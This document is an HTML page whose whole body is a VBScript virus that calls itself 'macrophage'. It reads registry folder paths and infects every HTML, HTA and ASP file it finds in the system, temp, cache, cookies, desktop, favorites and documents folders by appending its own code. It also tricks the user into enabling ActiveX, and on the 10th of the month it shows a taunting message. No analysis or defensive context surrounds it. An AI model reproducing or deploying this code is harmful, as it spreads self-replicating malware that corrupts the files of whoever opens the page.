<macrophage>
<html><head><title>Internet Explo$er</title></head><body>
<script language=vbscript>
On Error Resume Next
set fso=createobject("scripting.filesystemobject")
If err.number=429 then
document.write "<font face='Lucida Console' size='2' color=black>You need ActiveX enabled to see this file<br><a href='javascript:location.reload()'>Click Here</a> to reload and click Yes</font>"
Else

Set ws=CreateObject("WScript.Shell")
cache=ws.RegRead ("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache")
cook=ws.RegRead ("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cookies")
desk=ws.RegRead ("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Desktop")
favor=ws.RegRead ("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Favorites")
pers=ws.RegRead ("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal")
infect(fso.GetSpecialFolder(0))
infect(fso.GetSpecialFolder(1))
infect(fso.GetSpecialFolder(2))
infect(cache)
infect(cook)
infect(desk)
infect(favor)
infect(pers)

If Day(Now())=10 Then
document.write "<font face='verdana' size='2' color=black>Sorry but your browser can't read this page.<br>Try an another day.<br></font>"
document.write "<font face='verdana' size='2' color=blue><br>GOOD BYE and HAVE A NICE DAY.</font>"
End If

End If

Function infect(doss)
Set FolderObj = FSO.GetFolder(doss)
	Set FO = FolderObj.Files
	For each cible in FO
		ext = lcase(FSO.GetExtensionName(cible.Name))
		if ext="htm" or ext="html" or ext="htz" or ext="hta" or ext="asp"  Then
			Set good = fso.OpenTextFile(cible.path, 1, False)
			if good.readline <> "<macrophage>" Then
				good.close()
				Set good = fso.OpenTextFile(cible.path, 1, False)
				htmorg = good.ReadAll()
				good.close()
				Set virus = document.body.createTextRange
				Set good = fso.CreateTextFile(cible.path, True, False)
				good.WriteLine "<macrophage>"
				good.Write(htmorg)
				good.WriteLine virus.htmltext
				good.Close()
			else
				good.close()
			end if
		end if
	next
End Function
</script></html>